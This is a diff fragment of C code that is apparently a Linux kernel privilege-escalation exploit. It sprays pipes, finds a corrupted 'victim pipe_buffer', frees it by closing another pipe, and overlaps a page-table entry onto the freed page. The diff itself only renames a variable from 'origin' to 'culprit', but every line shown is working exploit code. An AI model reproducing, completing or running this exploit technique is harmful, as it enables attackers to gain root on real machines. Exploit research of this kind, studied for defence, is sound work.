@@ -89,15 +89,15 @@ int main(void) {
 
     puts("[ ] finding the victim pipe_buffer");
     i32 victim[2] = {0};
-    i32 origin[2] = {0};
+    i32 culprit[2] = {0};
     for (u32 i = 0; i < NUM_PIPE_SPRAY; i++) {
         u32 idx;
         CHECK(read(pipefd[i][0], &idx, 4));
         if (idx != i) {
             victim[0] = pipefd[idx][0];
             victim[1] = pipefd[idx][1];
-            origin[0] = pipefd[i][0];
-            origin[1] = pipefd[i][1];
+            culprit[0] = pipefd[i][0];
+            culprit[1] = pipefd[i][1];
             goto found_victim;
         }
     }
@@ -106,9 +106,9 @@ int main(void) {
 
 found_victim:
     puts("[+] found the victim pipe_buffer");
-    puts("[ ] freeing the pipe_buffer by closing the original pipefd");
-    CHECK(close(origin[0]));
-    CHECK(close(origin[1]));
+    puts("[ ] freeing the pipe_buffer by closing the culprit pipefd");
+    CHECK(close(culprit[0]));
+    CHECK(close(culprit[1]));
 
     puts("[+] overlapping PTE to the freed page");
     for (u32 i = 1; i < NUM_PTE_SPRAY; i++) {
